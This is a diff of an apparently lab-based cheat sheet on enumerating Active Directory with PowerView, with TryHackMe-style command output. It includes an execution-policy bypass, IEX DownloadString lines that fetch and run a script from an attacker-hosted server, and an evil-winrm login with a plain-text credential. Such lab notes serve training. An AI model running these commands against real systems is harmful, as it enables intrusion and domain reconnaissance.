@@ -2,10 +2,11 @@
 powershell -ep bypass
 
 ### [103 functions in PowerView.ps1](#103-functions-in-powerviewps1-1)
-```
+```sh
 cat PowerView.ps1 | grep ^funct |nl
 gc .\PowerView.ps1 | sls ^func
 ```
+
 ### [Check specific function in PowerShell script](#check-specific-function-in-powershell-script-1)
 
 ## [Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
@@ -39,7 +40,7 @@ Get-DomainUser -SPN
 ### Examples
 
 ### Check specific function in PowerShell script
-```
+```sh
 PS C:\> gc .\PowerView.ps1 | sls ^func.*Get-NetUser
 
 function Get-NetUser
@@ -47,7 +48,7 @@ function Get-NetUser
 
 ### Enumerate the domain users with "Get-NetUser | select cn"
 "Get-NetUser" produces a lot of output. To only filter "cn", use "select" as follows:
-```
+```sh
 PS C:\> Get-NetUser | select cn
 
 cn                  
@@ -63,6 +64,7 @@ POST{P0W3RV13W_FTW}
 ssh
 ```
 
+```sh
 PS C:\a> Get-NetUser | select cn, lastlogon
 
 cn                  lastlogon             
@@ -76,9 +78,10 @@ Machine-2           5/14/2020 12:32:08 PM
 SQL Service         12/31/1600 4:00:00 PM
 POST{P0W3RV13W_FTW} 12/31/1600 4:00:00 PM
 sshd                12/31/1600 4:00:00 PM
-
+```
 
 ### Get-NetGroup -UserName Admin2 | select cn
+```sh
 PS C:\a> Get-NetGroup -UserName Admin2 | select cn
 
 cn
@@ -89,9 +92,10 @@ Schema Admins
 Domain Admins
 Group Policy Creator Owners
 Domain Users
-
+```
 
 ### Out of these 3 hosts, only 1 is responded to ping
+```sh
 PS C:\a> Get-NetComputer | select cn, operatingsystem
 
 cn              operatingsystem                  
@@ -99,15 +103,17 @@ cn              operatingsystem
 DOMAIN-CONTROLL Windows Server 2019 Standard
 DESKTOP-2       Windows 10 Enterprise Evaluation
 DESKTOP-1       Windows 10 Enterprise Evaluation
+```
 
-
+```sh
 PS C:\a> Get-NetComputer -Ping | select cn
 
 cn              
 --
 DOMAIN-CONTROLL
-
+```
 ### Ping manually
+```sh
 PS C:\a> ping DOMAIN-CONTROLL
 
 Pinging DOMAIN-CONTROLL [10.10.140.5] with 32 bytes of data:
@@ -127,10 +133,10 @@ PS C:\a>
 PS C:\a> ping DESKTOP-2
 Ping request could not find host DESKTOP-2. Please check the name and try again.
 PS C:\a>
-
+```
 ### Enumerate the domain groups with "Get-NetGroup *admin*"
 Get-NetGroup -GroupName *admin*
-```
+```sh
 PS C:\> Get-NetGroup *admin*
 Administrators 
 Hyper-V Administrators 
@@ -150,9 +156,8 @@ PS C:\>
 ```
 
 ### Get-NetDomain
-```
+```sh
 PS C:\a> Get-NetDomain
-
 
 Forest                  : CONTROLLER.local
 DomainControllers       : {Domain-Controller.CONTROLLER.local}
@@ -166,6 +171,8 @@ InfrastructureRoleOwner : Domain-Controller.CONTROLLER.local
 Name                    : CONTROLLER.local
 ```
 
+### [Get-NetDomainController](#get-netdomaincontroller)
+```sh
 PS C:\a> Get-NetDomainController
 
 Forest                     : CONTROLLER.local
@@ -182,7 +189,7 @@ OutboundConnections        : {}
 Name                       : Domain-Controller.CONTROLLER.local
 Partitions                 : {DC=CONTROLLER,DC=local, CN=Configuration,DC=CONTROLLER,DC=local,
                              CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local, DC=DomainDnsZones,DC=CONTROLLER,DC=local...}
-
+```
 
 PS C:\a> Get-DomainSID
 S-1-5-21-849420856-2351964222-986696166
@@ -275,7 +282,7 @@ SQL Service
 
 ### 103 functions in PowerView.ps1
 ### gc .\PowerView.ps1 | sls ^func
-```
+```sh
 $ cat PowerView.ps1 | grep ^funct |nl
      1  function New-InMemoryModule {
      2  function func {
@@ -389,13 +396,13 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 
 # local
-```
+```sh
 cd ~/tools
 python -m http.server 80
 ```
 
 # remote
-```
+```sh
 evil-winrm -i $ip -u svc-alfresco -p s3rvice
 menu
 IEX (New-Object Net.WebClient).DownloadString('http://$myip/PowerView.ps1');
